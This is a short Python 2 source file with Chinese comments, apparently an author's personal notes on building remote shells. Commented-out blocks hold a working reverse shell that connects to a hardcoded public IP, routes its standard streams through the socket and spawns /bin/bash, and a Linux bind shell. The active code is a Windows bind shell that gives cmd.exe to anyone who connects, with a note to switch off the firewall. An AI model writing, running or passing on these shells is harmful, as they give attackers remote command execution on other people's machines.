#coding:utf-8
'''
Created on 2016年12月28日
@author: superxiaoxiong
'''

'''
python shell 使用
在windows的实现shell过程中，可能因为readline()等同步监听接受消息的函数造成死锁，所以一般再开一个线程来监听回复
'''



'''
python 反向shell
在公网使用nc -lp 端口  进行监听
在使用shell 脚本进行连接
p=subprocess.call(['/bin/sh', '-i']); //不知道-i的意义
p=subprocess.Popen('/bin/sh', stdin=0 ,stdout=1 ,stderr=2 ,shell=True); //尝试用Popen写出错
'''


'''
ip = "123.206.188.29"
port = "20003"
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip, int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash']);
'''


'''
正向连接 linux
python sell.py 监听该端口
使用nc进行连接
'''

'''
from socket import *
import subprocess
import os, threading, sys, time
server=socket(AF_INET,SOCK_STREAM)
server.bind((ip,int(port)))
server.listen(5)
print 'waiting for connect'
talk, addr = server.accept()
print 'connect from',addr
proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,stdout=talk, stderr=talk, shell=True)
'''

'''
正向连接 window  注意关闭系统防火墙
'''

from socket import *
import subprocess
import os, threading

def send(talk, proc):

    import time
    while True:
        msg = proc.stdout.readline()
        talk.send(msg)

if __name__ == "__main__":

    server=socket(AF_INET,SOCK_STREAM)
    server.bind(('192.168.1.103',25535))
    server.listen(5)
    print 'waiting for connect'
    talk, addr = server.accept()
    print 'connect from',addr
    proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,
    stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    t = threading.Thread(target = send, args = (talk, proc))
    t.setDaemon(True)
    t.start()
    while True:
        cmd=talk.recv(1024)
        proc.stdin.write(cmd)
        proc.stdin.flush()
    server.close()
